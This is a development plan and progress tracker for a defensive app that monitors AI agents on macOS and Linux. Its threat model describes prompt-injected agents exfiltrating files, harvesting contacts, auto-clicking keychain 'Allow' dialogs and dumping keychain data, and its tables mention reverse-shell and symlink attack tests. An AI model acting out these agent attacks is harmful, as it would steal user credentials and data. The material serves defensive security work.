# AISecurity — Cross-Platform Assessment & Implementation Plan

**Date:** 2026-03-28
**Status:** Phase 11b complete (reliability overhaul — always-on architecture). Phase 12 (commercial release) next.
**Last Updated:** 2026-04-02

---

## Product Philosophy

### Why this app exists

AI agents are becoming mainstream. People run them to manage files, send emails, browse the
web, write code, and automate workflows. But agents are **probabilistic, not deterministic** —
they don't follow rigid rules, they make judgment calls. And if an agent is prompted in a
sneaky way (prompt injection, social engineering, malicious instructions hidden in data it
processes), it can be tricked into doing things the user never intended:

- Exfiltrating sensitive files over the network
- Reading contacts and sending messages on the user's behalf
- Accessing keychain passwords via automation
- Modifying or deleting protected data
- Copying crypto wallet keys or financial documents

**The user needs a security layer that watches what agents do — and can apply the brakes.**

### Design principles

**1. Monitor first, block second.**
AISecurity's default posture is **observe and alert**, not block. Users should see what's
happening on their system and decide what to do about it. The app should never silently
prevent something the user actually wants to happen.

**2. User controls the dial, not us.**
Different users have different risk tolerances. Someone running a trusted coding assistant
needs less protection than someone running an autonomous agent with internet access.
AISecurity should let users configure:
- Which directories to monitor (or not)
- Which alert types trigger external notifications (or not)
- Whether vault files are encrypted, read-only, or just monitored
- Whether to block access or just alert
- How aggressive rate limiting should be

**3. Don't be annoying.**
A security tool that spams alerts gets disabled. Every notification sent must be
genuinely useful. Routine OS operations are silenced. External notifications are
rate-limited. The user should trust that when AISecurity alerts, it matters.

**4. Transparency over magic.**
Show the user exactly what's being monitored, what was detected, which process did it,
and what action was taken. No hidden behavior. Security tools must be trustworthy —
and trust comes from transparency.

**5. Agents are tools, not enemies.**
We're not trying to stop people from using AI agents. We're giving them the confidence
to use agents safely — knowing that if something goes wrong, they'll know about it
and can respond.

### Threat model: AI agents on your Mac

| Threat | How it happens | What AISecurity does |
|--------|---------------|---------------------|
| **File exfiltration** | Agent uploads sensitive files to external server | Local-only vault protection alerts on network exfiltration attempts |
| **Contact scraping** | Agent reads Address Book to harvest emails/phones | FileWatcher alerts on AddressBook access |
| **Keychain access** | Agent uses Accessibility perms to click "Allow" on keychain prompts | FileWatcher alerts on keychain file access; Phase 10: ES framework blocks unauthorized process |
| **Prompt injection** | Malicious instructions hidden in emails/files trick agent | PromptInjectionGuard detects 8 categories of injection |
| **Sensitive data in clipboard** | Agent copies API keys, passwords, crypto seeds | Clipboard monitor detects and alerts |
| **Malware delivery** | Agent downloads malicious files to Downloads | FileWatcher + ExternalFileSanitizer detect and quarantine |
| **Vault breach** | Agent or attacker tries to access encrypted vault files | Per-file DispatchSource + CRITICAL alert + external notification |
| **Brute force** | Repeated passphrase attempts on vault | 3-attempt lockout + external alert |

### How Apple protects sensitive data (and where the gaps are)

**Keychain / Passwords app:**
- Same data, different UI. Passwords app (macOS 15+) is a frontend for the Keychain system
- **Strong protections:** AES-256 encryption at rest, per-item ACLs (each entry specifies which
  apps can read it), user prompt on unauthorized access, Secure Enclave (Apple Silicon stores
  encryption key in hardware — disk cloning won't help)
- **The gap:** An AI agent with Accessibility permissions could automate clicking "Allow" on
  keychain access dialogs. The `security` CLI can dump keychain data if the Mac is unlocked.
  A sophisticated agent could read decrypted passwords from process memory.
- **What we do now:** FileWatcher monitors `~/Library/Keychains/` for file access
- **Phase 10 (Endpoint Security):** Detect exactly which process reads keychain files; block
  non-Apple, non-browser processes from accessing keychain data

**Contacts / Address Book:**
- Stored in `~/Library/Application Support/AddressBook/`
- macOS shows a permission prompt when apps first request Contacts access
- **The gap:** Once an app has Contacts permission, it can read everything silently. An agent
  with Contacts access could harvest names, emails, phone numbers, addresses — enough to
  impersonate the user or run social engineering campaigns
- **What we do:** FileWatcher monitors AddressBook directory for unauthorized access

**Photos:**
- Protected by Apple's Photos framework + TCC (Transparency, Consent, and Control)
- Apps must request permission; user grants "full access" or "limited access"
- **What we do:** FileWatcher monitors Photos Library and Pictures directory

**Calendar, Notes, Reminders:**
- Each has its own TCC permission gate
- **What we do:** FileWatcher monitors all three database directories

**The common thread:** Apple's TCC permission system is the first line of defense. But once
an app has permission (which agents often need to function), there's no ongoing monitoring
of WHAT it does with that access. That's the gap AISecurity fills.

---

## 0. Progress Tracker

### Repos & Infrastructure

| Component | Status | Location |
|-----------|--------|----------|
| AISecurity cloned (Swift, macOS) | ✅ Done | `/home/junc/AISecurity/` |
| MacSec cloned (JS/Node.js, reference) | ✅ Done | `/home/junc/MacSec/` |
| Full codebase audit (both repos) | ✅ Done | See §0b below |
| ElizaOS Rust security research | ✅ Done | See §0c below |
| SecurityCore Rust workspace | ✅ Done | `SecurityCore/` |
| Remote repo (GitHub) | ✅ Done | `github.com/hchengit/AISecurity` — 2026-03-30 |

### Phase 1: Mac Portability

| Component | Status | Location |
|-----------|--------|----------|
| External TOML config file | ✅ Done | `config.toml.example` (template) + `SecurityConfig.swift` (reads TOML) |
| PathResolver abstraction | ✅ Done | `Sources/AISecurity/Config/PathResolver.swift` |
| Env var overrides (MACSEC_*) | ✅ Done | 7 env vars: MODE, SECURITY_DIR, MAIL_DIR, MESSAGES_DB, LOG_DIR, QUARANTINE_DIR, SCAN_DIRS |
| Extract hardcoded protected paths to config | ✅ Done | `SensitiveDataDetector.swift` now reads from `SecurityConfig.shared.paths.protectedPaths` |
| Configurable mail/messages/quarantine dirs | ✅ Done | All modules read from `SecurityConfig` → `PathResolver` (TOML/env/default) |
| Install script portability | ✅ Done | `install.sh` supports `--install-dir`, `MACSEC_INSTALL_DIR`, `MACSEC_SECURITY_DIR`, generates default config.toml |
| TOMLKit SPM dependency | ✅ Done | `Package.swift` — `TOMLKit 0.6.0` |
| AISecurityApp.swift hardcoded paths | ✅ Done | dismissed.json + alerts.log now use config; Mail.app path has fallback |
| Verification: fresh Mac user account test | ✅ Done | All 4 steps passed (default paths, custom config, env override, no config fallback) — 2026-03-28 |

### Phase 2: Rust Core Library

| Component | Status | Location |
|-----------|--------|----------|
| Cargo workspace + crate structure | ✅ Done | `SecurityCore/Cargo.toml` workspace with `security-core` + `security-core-ffi` |
| Core data types (SeverityLevel, SecurityAlert) | ✅ Done | `severity.rs`, `alert.rs` |
| ThreatIntentParser (7-layer scoring) | ✅ Done | `threat_intent_parser.rs` — 6 layers, scoring thresholds match Swift |
| SensitiveDataDetector (40+ patterns) | ✅ Done | `sensitive_data.rs` — 40+ patterns across 9 categories |
| PromptInjectionGuard (8 categories) | ✅ Done | `prompt_injection.rs` — 8 groups + sanitize + heuristics |
| ExternalFileSanitizer patterns | ✅ Done | `file_sanitizer.rs` — 9 groups + suspicious filenames |
| Email threat patterns (9 categories) | ✅ Done | `email_patterns.rs` — 9 groups + trusted domains + attachment helpers |
| Message threat patterns (9 categories) | ✅ Done | `message_patterns.rs` — 9 groups + known phishing domains |
| SenderWhitelist logic | ✅ Done | `sender_whitelist.rs` — policy engine + freemail blocklist + JSON persistence |
| TOML config parser (same format as Phase 1) | ✅ Done | `config.rs` — TOML parsing + env var overrides (MACSEC_*) |
| Path resolver (platform-aware defaults) | ✅ Done | `path_resolver.rs` — cfg!(target_os) for macOS vs Linux paths |
| FFI layer (C ABI + cbindgen) | ✅ Done | `security-core-ffi/src/lib.rs` — 10 exports + 6 free functions |
| Generated C header | ✅ Done | `CSecurityCore/include/security_core.h` via cbindgen — 2026-03-28 |
| cargo test — all modules passing | ✅ Done | 90 tests passing — 2026-03-28 |
| Cross-validation: Rust output == Swift output | ✅ Done | All modules build+run via FFI, agent starts cleanly — 2026-03-28 |

### Phase 3: macOS FFI Integration

| Component | Status | Location |
|-----------|--------|----------|
| CSecurityCore module.modulemap | ✅ Done | `CSecurityCore/module.modulemap` + `include/` + `lib/` |
| Swift bridge wrapper | ✅ Done | `Sources/AISecurity/RustBridge/SecurityCoreBridge.swift` — all 10 FFI exports wrapped |
| build-rust.sh (cargo + copy artifacts) | ✅ Done | `build-rust.sh` — builds, generates header, copies .a to CSecurityCore/ |
| Migrate: ThreatIntentParser → Rust | ✅ Done | Thin wrapper calling `SecurityCoreBridge.parseIntent()` |
| Migrate: SensitiveDataDetector → Rust | ✅ Done | Pattern matching via Rust; `isProtectedPath()` stays Swift |
| Migrate: PromptInjectionGuard → Rust | ✅ Done | `validate()` + `sanitize()` both via Rust; logging stays Swift |
| Migrate: ExternalFileSanitizer → Rust | ✅ Done | `scanFileContent()` via Rust; file I/O, cache, quarantine stay Swift |
| Migrate: EmailScanner patterns → Rust | ✅ Done | `analyzeEmail()` via Rust; .emlx parsing, attachment checks, whitelist stay Swift |
| Migrate: MessagesScanner patterns → Rust | ✅ Done | `analyzeMessage()` via Rust; SQLite, timer, state persistence stay Swift |
| install.sh updated with Rust build step | ✅ Done | `install.sh` — runs `build-rust.sh` before `swift build` |
| Performance benchmark (NSRegularExpression vs regex crate) | ✅ Done | Rust 2.4x faster (34µs vs 83µs per-op, 1000×12 iterations) — 2026-03-29 |

### Phase 4: Linux Daemon

| Component | Status | Location |
|-----------|--------|----------|
| Linux daemon crate | ✅ Done | `crates/security-linux/` — binary + 6 modules |
| File watcher (inotify) | ✅ Done | `file_watcher.rs` — inotify on Downloads/Desktop/Documents + SHA256 cache |
| Email scanner (Thunderbird mbox/maildir) | ✅ Done | `email_scanner.rs` — mbox parser + mailparse + intent scoring |
| Messages scanner (Signal Desktop SQLite) | ✅ Done | `message_scanner.rs` — rusqlite polling + intent scoring |
| Clipboard monitor (arboard) | ✅ Done | `clipboard.rs` — 2s polling, sensitive data + prompt injection |
| Desktop notifications (notify-rust/D-Bus) | ✅ Done | `notifications.rs` — D-Bus notifications with urgency levels |
| System tray (ksni) | ⬜ Deferred to Phase 6 | Needs GTK/icon assets |
| systemd user service | ✅ Done | `deploy/linux/security-core.service` — sandboxed, auto-restart |
| Linux install script | ✅ Done | `deploy/linux/install.sh` — build, install, config, systemd enable |
| Verification: file watcher test | ✅ Done | Reverse shell in ~/Downloads → CRITICAL alert — 2026-03-28 |

### Phase 5: ElizaOS-Inspired Features

| Component | Status | Location |
|-----------|--------|----------|
| AES-256-GCM encryption (config + whitelist + logs) | ✅ Done | `encryption.rs` — encrypt/decrypt + SHA-256 key derivation + 4 AAD contexts + hex serialization |
| Sensitive key filtering (log/display redaction) | ✅ Done | `key_filter.rs` — 24 key patterns + 8 value patterns + JSON/config redaction |
| WASM sandbox for custom detection rules | ✅ Done | `wasm_sandbox.rs` — wasmtime loader + memory isolation + plugin discovery |
| rustls TLS transport (future remote logging) | ✅ Done | `tls_transport.rs` — pure-Rust TLS + LogShipper for SIEM integration |
| Process lifecycle manager (cancellation tokens) | ✅ Done | `process_manager.rs` — CancellationToken + child tokens + ProcessManager + cancellable_sleep |

### Phase 6: Feature Parity & Polish

| Component | Status | Location |
|-----------|--------|----------|
| Shared JSON test suite (both platforms) | ✅ Done | `tests/integration/test_cases.json` — 25 cross-platform test cases |
| Linux TUI threat viewer (ratatui) | ✅ Done | `tui.rs` — ratatui + crossterm, severity badges, navigate/dismiss/reload |
| Documentation (README, CONFIG, CUSTOM_RULES) | ✅ Done | `SecurityCore/README.md` — architecture, quick start, config, WASM rules |
| Feature parity matrix verified | ✅ Done | See §6.3 — all detection modules identical via Rust core |

### Phase 7: Vault — File/Folder Protection with Encryption + Auth

| Component | Status | Location |
|-----------|--------|----------|
| **Vault Core (Rust)** | | |
| Vault manifest (vault.json — tracks protected files/folders) | ✅ Done | `vault.rs` — encrypted manifest with VaultEntry structs |
| File encrypt (AES-256-GCM, in-place → `.vault` extension) | ✅ Done | `vault.rs` — uses existing `encryption.rs` + VAULT_AAD |
| File decrypt (auth-gated, restore original) | ✅ Done | `vault.rs` — unlock() restores to original path |
| Secure delete (overwrite original after encrypt) | ✅ Done | `vault.rs` — 3-pass random overwrite before unlink |
| Folder protection (recursive encrypt all contents) | ✅ Done | `vault.rs` — add_directory() recursive walk |
| Vault manifest persistence (JSON, itself encrypted) | ✅ Done | `vault.json.enc` — AES-256-GCM with VAULT_MANIFEST_AAD |
| Vault status queries (list, verify integrity) | ✅ Done | `vault.rs` — list(), verify_passphrase() |
| 3 protection levels (locked/read-only/local-only) | ✅ Done | `vault.rs` — ProtectionLevel enum + per-level enforcement |
| 5 protection levels (+ read-only+local, locked+local combos) | ✅ Done | `vault.rs` — ReadOnlyLocal, LockedLocal variants + is_locked()/is_read_only()/is_local_only() helpers |
| Toggle local-only on existing entries | ✅ Done | `vault.rs` — toggle_local_only() flips combo protections |
| Passphrase change (re-encrypt all files + manifest) | ✅ Done | `vault.rs` — change_passphrase() |
| 6 Rust tests passing | ✅ Done | roundtrip, wrong passphrase, change passphrase, read-only, list |
| **Vault FFI + Swift Bridge** | | |
| FFI exports for vault operations (C ABI) | ✅ Done | 12 exports: setup, add, unlock, lock, remove, list, change_passphrase, toggle_local_only, etc. |
| FFI support for 5 protection levels (0-4 mapping) | ✅ Done | `protection_to_u8()` / `u8_to_protection()` updated for combo variants |
| SecurityCoreBridge.swift vault wrappers | ✅ Done | All 12 vault operations wrapped with Swift types |
| **Authentication Gate (macOS)** | | |
| LocalAuthentication (Touch ID / system password) | ✅ Done | `Vault/AuthGate.swift` — LAContext.deviceOwnerAuthentication |
| Auth session caching (5-minute window) | ✅ Done | `AuthGate.swift` — configurable sessionTimeout |
| Cancel vs error distinction (no error dialog on cancel) | ✅ Done | `AuthGate.swift` — LAError.userCancel/appCancel/systemCancel → silent dismiss |
| Session invalidation after passphrase change | ✅ Done | `VaultManager.swift` — forces fresh Touch ID for next sensitive op |
| **Authentication Gate (Linux)** | | |
| PAM / polkit owner verification | ⬜ Not started | `security-linux/src/auth.rs` |
| **Menu Bar UI (macOS)** | | |
| "Protect Files..." menu item with NSOpenPanel (multi-select) | ✅ Done | `AISecurityApp.swift` — files + folders, protection level picker |
| Vault status panel (list protected files) | ✅ Done | `VaultWindowView.swift` — shows all entries with status |
| Vault window: folder-grouped display (collapsible) | ✅ Done | `VaultWindowView.swift` — DisclosureGroup per folder, auto-expand |
| Vault window: Toggle Local-Only button | ✅ Done | `VaultWindowView.swift` — add/remove local-only monitoring on existing entries |
| Vault window: combo protection badges (e.g. READ-ONLY + LOCAL) | ✅ Done | `VaultWindowView.swift` — dual badges for combo protections |
| "Unlock Files..." / "Lock Open Files" menu items | ✅ Done | `AISecurityApp.swift` — auth-gated |
| "Change Passphrase..." menu item | ✅ Done | `AISecurityApp.swift` — old/new/confirm flow |
| **User Education & Safety** | | |
| First-run setup wizard (3 panels: welcome, passphrase, recovery) | ✅ Done | `VaultDialogs.swift` — runSetupWizard() |
| Passphrase setup with min-length + confirmation | ✅ Done | `VaultDialogs.swift` — 8-char minimum, must match |
| Pre-encrypt confirmation per protection level | ✅ Done | `VaultDialogs.swift` — confirmEncrypt() with level-specific text |
| Pre-decrypt confirmation | ✅ Done | `VaultDialogs.swift` — confirmDecrypt() |
| Recovery instructions saved to `VAULT-RECOVERY.txt` | ✅ Done | `vault.rs` — write_recovery_file() at setup |
| Passphrase change workflow (old → new → confirm) | ✅ Done | `VaultDialogs.swift` — promptChangePassphrase() |
| Protection level picker (checkbox UI, combos) | ✅ Done | `VaultDialogs.swift` — Locked/Read-only mutually exclusive checkboxes + independent Local-only checkbox |
| Confirmation dialogs for 5 protection levels | ✅ Done | `VaultDialogs.swift` — level-specific text for all combos |
| **FileWatcher Integration** | | |
| Alert on unauthorized access attempts to vault files | ✅ Done | `FileWatcher.swift` — per-file DispatchSource + VAULT_FILE_ACCESS alert (CRITICAL) + in-app dialog |
| Block-and-notify when non-authenticated process touches vault entries | ✅ Done | `VaultManager.swift` — watched-paths cache, `VaultOperationScope` suppression, NotificationCenter reload |
| Thread-safe debounce timers (crash fix) | ✅ Done | `FileWatcher.swift` — NSLock protecting concurrent dictionary access |
| **Linux TUI** | | |
| Vault management screen in ratatui TUI | ⬜ Not started | `tui.rs` |
| File browser with checkbox selection | ⬜ Not started | `tui.rs` |
| **Verification** | | |
| Rust unit tests (6 tests passing) | ✅ Done | encrypt/decrypt roundtrip, wrong passphrase, change, read-only, list |
| macOS build + install + run | ✅ Done | Installed to /Applications, shield icon with Vault menu — 2026-03-29 |
| Auth gate test (Touch ID / password prompt) | ✅ Done | Tested — Touch ID prompt, cancel handling, session caching all working — 2026-03-30 |
| Passphrase change test | ✅ Done | Tested — change works, Touch ID required each time (session invalidation fix) — 2026-03-30 |
| Vault folder grouping test | ✅ Done | Tested — folders as collapsible groups in all sections — 2026-03-30 |
| Combo protection test (read-only + local-only) | ✅ Done | Tested — checkbox picker, dual badges, toggle button all working — 2026-03-30 |
| Finder tags for combo protections | ✅ Done | `FinderTags.swift` — multi-tag support for combo levels — 2026-03-30 |

### Phase 8: External Notifications (Telegram, Discord, Email)

| Component | Status | Location |
|-----------|--------|----------|
| **Notification Manager (Swift)** | | |
| NotificationManager — channel routing + severity filtering | ✅ Done | `Sources/AISecurity/Notifications/NotificationManager.swift` |
| NotificationConfig — JSON persistence for channel credentials | ✅ Done | `Sources/AISecurity/Notifications/NotificationConfig.swift` |
| Severity routing (CRITICAL→all, HIGH→Telegram+Discord+Email, MEDIUM→local only) | ✅ Done | `NotificationManager.swift` |
| **Telegram Channel** | | |
| Telegram Bot API integration (sendMessage with MarkdownV2) | ✅ Done | `Sources/AISecurity/Notifications/TelegramChannel.swift` |
| Bot token + chat ID configuration | ✅ Done | `NotificationConfig.swift` |
| Formatted alert messages (severity badge, file path, findings) | ✅ Done | `TelegramChannel.swift` |
| Test message send | ✅ Done | `TelegramChannel.swift` |
| **Discord Channel** | | |
| Discord webhook integration (POST embeds) | ✅ Done | `Sources/AISecurity/Notifications/DiscordChannel.swift` |
| Webhook URL configuration | ✅ Done | `NotificationConfig.swift` |
| Rich embed formatting (color-coded severity, fields) | ✅ Done | `DiscordChannel.swift` |
| Test message send | ✅ Done | `DiscordChannel.swift` |
| **Email Channel** | | |
| SMTP email via Gmail App Password (raw socket TLS on port 587) | ✅ Done | `Sources/AISecurity/Notifications/EmailChannel.swift` |
| Gmail address + app password configuration | ✅ Done | `NotificationConfig.swift` |
| HTML + plain text email templates | ✅ Done | `EmailChannel.swift` |
| Test email send | ✅ Done | `EmailChannel.swift` |
| **Setup Wizard (macOS)** | | |
| Notification setup dialog (accessible from menu bar) | ✅ Done | `Sources/AISecurity/Notifications/NotificationSetupDialog.swift` |
| Telegram setup instructions (BotFather flow, get chat ID) | ✅ Done | `NotificationSetupDialog.swift` |
| Discord setup instructions (create webhook) | ✅ Done | `NotificationSetupDialog.swift` |
| Email setup instructions (Gmail 2FA + app password) | ✅ Done | `NotificationSetupDialog.swift` |
| Per-channel test button (send test notification) | ✅ Done | `NotificationSetupDialog.swift` |
| Per-channel enable/disable toggle | ✅ Done | `NotificationSetupDialog.swift` |
| **Integration** | | |
| Hook into SecurityLogger.alert() for CRITICAL/HIGH alerts | ✅ Done | `SecurityLogger.swift` + `NotificationManager.swift` |
| Hook into FileWatcher VAULT_FILE_ACCESS alerts | ✅ Done | `SecurityDaemon.swift` — in-app dialog + external channels |
| Menu bar item: "Notification Settings..." | ✅ Done | `AISecurityApp.swift` — under Notifications section |
| **Linux** | | |
| Same channel implementations via Rust HTTP (reqwest) | ⬜ Not started | `security-linux/src/notifications/` |
| **Verification** | | |
| Telegram test message delivery | ✅ Done | Tested — bot sends formatted alerts — 2026-03-30 |
| Discord test embed delivery | ✅ Done | Tested — webhook sends color-coded embeds — 2026-03-30 |
| Email test delivery (Gmail) | ✅ Done | Tested — HTML email via SMTP/curl — 2026-03-30 |
| VAULT_FILE_ACCESS → external notification end-to-end | ✅ Done | Tested — touch .vault → in-app + Telegram + Discord + Email — 2026-03-30 |

### Phase 9: Security Hardening — Self-Protection & Attack Surface Reduction

| Component | Status | Location |
|-----------|--------|----------|
| **P0 — Critical (app can be defeated trivially)** | | |
| Daemon always-restart (KeepAlive → true) | ✅ Done | `install.sh` — LaunchAgent plist — 2026-03-30 |
| Symlink resolution in vault (canonicalize all paths) | ✅ Done | `vault.rs` — add/lock/unlock/remove + secure_delete — 2026-03-30 |
| Config integrity checks (ownership, permissions, tamper alert) | ✅ Done | `SecurityConfig.swift` — verify 0600 + owner on load, auto-harden — 2026-03-30 |
| Self-monitoring (watch own binary, config dir, logs dir) | ✅ Done | `SecurityDaemon.swift` — DispatchSource on app bundle, config, logs + external alert — 2026-03-30 |
| **P1 — High (exploitable with moderate effort)** | | |
| PBKDF2 key derivation (replace single SHA-256) | ✅ Done | `encryption.rs` — PBKDF2-HMAC-SHA256, 100k iterations — 2026-03-30 |
| Notification credentials → macOS Keychain | ✅ Done | `NotificationConfig.swift` — SecItemAdd/CopyMatching + auto-migration from JSON — 2026-03-30 |
| FFI null pointer safety (Swift side) | ✅ Done | `SecurityCoreBridge.swift` — safeString() guard on all String(cString:) calls — 2026-03-30 |
| Notification content sanitization (email header + log injection) | ✅ Done | `EmailChannel.swift` — sanitizeHeader(), escapeHTML() — 2026-03-30 |
| Passphrase memory zeroing (Data + explicit wipe) | ✅ Done | `VaultManager.swift` — clearPassphrase() overwrites before release — 2026-03-30 |
| Passphrase strength indicator (real-time bar + educational tips) | ✅ Done | `VaultDialogs.swift` — setup wizard + change passphrase; 8 chars ≈ 20%, 4 words ≈ 90%+ — 2026-03-30 |
| FFI path separator fix (colon → newline delimiter) | ✅ Done | `security-core-ffi/src/lib.rs` + `SecurityCoreBridge.swift` — `\n` separator — 2026-03-30 |
| **P2 — Medium (defense-in-depth)** | | |
| Pin dependency versions (exact in Package.swift + Cargo.toml) | ✅ Done | `Package.swift` exact: "0.6.0", `Cargo.toml` all exact versions — 2026-03-30 |
| Webhook URL validation (HTTPS only, no localhost/internal) | ✅ Done | `DiscordChannel.swift` + `TelegramChannel.swift` — scheme + host checks — 2026-03-30 |
| Env var path validation (reject traversal, symlinks, /tmp) | ✅ Done | `PathResolver.swift` — validatePath() rejects /../, /tmp, external symlinks — 2026-03-30 |
| TOCTOU fix in FileWatcher (symlink-safe lstat) | ✅ Done | `FileWatcher.swift` — lstat() replaces fileExists+attributesOfItem — 2026-03-30 |
| **Verification** | | |
| Symlink attack test (ln -s /etc/passwd → vault add) | ⬜ Not started | — |
| Config tampering test (disable scanner → alert fires) | ⬜ Not started | — |
| Daemon kill test (killall → auto-restart) | ⬜ Not started | — |
| Credential storage test (Keychain read/write cycle) | ⬜ Not started | — |
| PBKDF2 key derivation test (existing vault still decrypts after migration) | ⬜ Not started | — |

### Phase 10: Linux Completion

| Component | Status | Location |
|-----------|--------|----------|
| **Linux Auth Gate** | | |
| PAM authentication for vault operations | ✅ Done | `security-linux/src/auth.rs` — PAM Client + password conv — 2026-03-31 |
| Auth session caching (5-minute window) | ✅ Done | `security-linux/src/auth.rs` — Instant-based session with 300s timeout — 2026-03-31 |
| 3-attempt lockout with external alert | ✅ Done | `security-linux/src/auth.rs` — MAX_FAILED_ATTEMPTS=3, 5-min lockout — 2026-03-31 |
| **Vault TUI Screen** | | |
| Vault list tab in ratatui TUI (table with badges) | ✅ Done | `security-linux/src/tui.rs` — multi-screen TUI (Alerts/Vault/FileBrowser/Auth) — 2026-03-31 |
| Folder grouping (collapsible tree) | ✅ Done | `security-linux/src/tui.rs` — BTreeMap folder groups, Enter to expand/collapse — 2026-03-31 |
| Vault actions: unlock, release, toggle local-only | ✅ Done | `security-linux/src/tui.rs` — u/l/t keys, auth-gated via PAM — 2026-03-31 |
| Auth prompt (masked password input + attempt counter) | ✅ Done | `security-linux/src/tui.rs` — bullet-masked input, remaining attempts shown — 2026-03-31 |
| Protection level picker popup | ✅ Done | `security-linux/src/tui.rs` — centered popup, mutual exclusivity for locked/read-only — 2026-03-31 |
| **File Browser Widget** | | |
| Filesystem navigator (arrow keys, space select, enter) | ✅ Done | `security-linux/src/tui_file_browser.rs` — dirs first, alphabetical, enter=open — 2026-03-31 |
| Multi-select with checkboxes | ✅ Done | `security-linux/src/tui_file_browser.rs` — Space toggles, tracked in selected_paths — 2026-03-31 |
| **System Tray** | | |
| ksni StatusNotifierItem (GNOME/KDE/XFCE) | ⬜ Deferred | ksni dependency added, needs GTK icon assets |
| Shield icon + right-click menu | ⬜ Deferred | Requires icon design + menu wiring |
| **External Notifications (Rust)** | | |
| Telegram channel (reqwest + MarkdownV2) | ✅ Done | `security-linux/src/ext_notifications/telegram.rs` — formatted alerts + test — 2026-03-31 |
| Discord channel (reqwest + embeds) | ✅ Done | `security-linux/src/ext_notifications/discord.rs` — rich embeds + webhook validation — 2026-03-31 |
| Email channel (lettre SMTP) | ✅ Done | `security-linux/src/ext_notifications/email.rs` — Gmail SMTP via lettre — 2026-03-31 |
| NotificationManager + rate limiting | ✅ Done | `security-linux/src/ext_notifications/mod.rs` — 3-tier rate limiting (type/file/global) — 2026-03-31 |
| Config persistence (shared JSON format) | ✅ Done | `security-linux/src/ext_notifications/config.rs` — shared JSON + 0600 perms — 2026-03-31 |
| **Verification** | | |
| PAM auth test | ⬜ Not started | — |
| TUI vault screen test | ⬜ Not started | — |
| System tray test | ⬜ Not started | — |
| External notification end-to-end test | ⬜ Not started | — |
| Auth lockout + external alert test | ⬜ Not started | — |

### Phase 11: Vault Recovery Key & Deletion Protection

| Component | Status | Location |
|-----------|--------|----------|
| **Recovery Key System** | | |
| 12-word seed phrase generation (128-bit entropy, SecRandomCopyBytes) | ✅ Done | `VaultManager.swift` — 768-word list, cryptographically secure — 2026-04-01 |
| SHA-256 hash storage (never store the key itself) | ✅ Done | `VaultManager.swift` — stored at `.vault-recovery-hash` — 2026-04-01 |
| Numbered two-column display during setup | ✅ Done | `VaultDialogs.swift` — 1-12 in two columns, selectable text — 2026-04-01 |
| Copy to clipboard option with security warning | ✅ Done | `VaultDialogs.swift` — clipboard copy + "clear your clipboard" reminder — 2026-04-01 |
| Verification quiz (all 12 words, randomized order) | ✅ Done | `VaultDialogs.swift` — must get all 12 correct, wrong words identified by number — 2026-04-01 |
| "Show Key Again" option during quiz | ✅ Done | `VaultDialogs.swift` — re-displays numbered words, clears fields for retry — 2026-04-01 |
| Forgot Passphrase recovery flow | ✅ Done | `VaultDialogs.swift` — enter 12 words → verify hash → reset vault + new passphrase — 2026-04-01 |
| New recovery key generated on reset | ✅ Done | `VaultDialogs.swift` — fresh 12 words shown after successful reset — 2026-04-01 |
| "Forgot Passphrase..." menu item | ✅ Done | `AISecurityApp.swift` — under Vault section — 2026-04-01 |
| **Deletion Protection** | | |
| macOS immutable flag (uchg) on vault-protected files | ✅ Done | `FinderTags.swift` — `chflags uchg` prevents delete/move/rename — 2026-04-01 |
| .vault files locked after encryption | ✅ Done | `AISecurityApp.swift` — `protectFromDeletion()` called after vault add — 2026-04-01 |
| Read-only files locked (uchg + chmod 444) | ✅ Done | `FinderTags.swift` — double protection: permissions + immutable flag — 2026-04-01 |
| Local-only files locked | ✅ Done | `FinderTags.swift` — immutable flag on monitored files — 2026-04-01 |
| Unlock before vault operations (decrypt, release, temp write) | ✅ Done | `VaultWindowView.swift` — `unprotectFromDeletion()` before unlock/remove — 2026-04-01 |
| Re-lock after re-encryption | ✅ Done | `VaultWindowView.swift` — `lockFile()` after re-encrypt timer fires — 2026-04-01 |
| Re-lock read-only after temp write timeout | ✅ Done | `VaultWindowView.swift` — `lockFile()` after 5-minute write window — 2026-04-01 |
| **Verification** | | |
| Recovery key setup + quiz tested | ✅ Done | Deliberate wrong word caught, retry works — 2026-04-01 |
| Forgot Passphrase recovery tested | ✅ Done | 12 words → new passphrase → new recovery key — 2026-04-01 |
| Deletion protection tested | ✅ Done | Finder shows "item is locked" on delete attempt — 2026-04-01 |

### Phase 11b: Reliability Overhaul — Always-On Architecture

**Last Updated:** 2026-04-02

**Problems discovered:**

1. **Vault tracker is not always-on.** After app restart, `VaultFileTracker.trackedFiles` is empty.
   `syncTracker()` requires the passphrase (to decrypt manifest), so tracking only starts when
   the user opens the vault window or performs a vault operation. Between restart and first
   interaction, protected files are completely unmonitored.

2. **File moves not persisted.** `handleFileMoved()` detects moves via macOS bookmarks but never
   updates the Rust manifest or the UI. Vault shows stale paths; operations fail on moved files.

3. **Deleted files haunt the vault.** Manifest entries persist after permanent deletion. Cleanup
   only runs when the vault window opens (`cleanupDeletedEntries()` in `onAppear`).

4. **Batch protection freezes the app.** Encrypting 1226 files blocks the UI with no progress bar,
   no cancel button, and no prominent file count warning. User accidentally protected 1226 files
   with no way to abort.

5. **Email scanning silently fails.** `findEmlxFiles()` uses `try?` which returns `[]` when FDA
   blocks subdirectory traversal. No error logged, no user indication. Messages scanner works
   because it opens a single SQLite file.

6. **No audit trail.** No structured log of vault operations, file moves, deletions, or access
   attempts. A security app defending against prompt injection and file tampering must record
   what happened and when.

7. **Non-atomic `changeProtection()`.** Uses remove+add pattern that corrupts the vault manifest.

**Goal:** Make the app a true always-on background daemon. Vault files tracked from startup
without passphrase. Email/message scanning verified active. All suspicious and protected-file
events logged to a 30-day audit trail. Batch operations cancellable with progress feedback.

#### Step 1: Vault Audit Log

| Component | Status | Location |
|-----------|--------|----------|
| `VaultAuditLog` class (singleton, thread-safe serial queue) | ✅ Done | New: `Vault/VaultAuditLog.swift` |
| JSON Lines format (`vault-audit.jsonl`) in `~/.mac-security/logs/` | ✅ Done | `VaultAuditLog.swift` |
| Event types: FILE_ADDED, FILE_REMOVED, FILE_MOVED, FILE_DELETED, PROTECTION_CHANGED, FILE_UNLOCKED, FILE_LOCKED, FILE_MODIFIED, UNAUTHORIZED_ACCESS, PASSPHRASE_CHANGED, THREAT_DETECTED | ✅ Done | `VaultAuditLog.swift` |
| Log rotation: rotate at 10MB, date-stamped archives | ✅ Done | `VaultAuditLog.swift` |
| 30-day retention: delete old rotations on startup | ✅ Done | `VaultAuditLog.swift` |
| `getEntries(since:limit:)` for UI viewer | ✅ Done | `VaultAuditLog.swift` |

#### Step 2: Unencrypted Tracking Sidecar

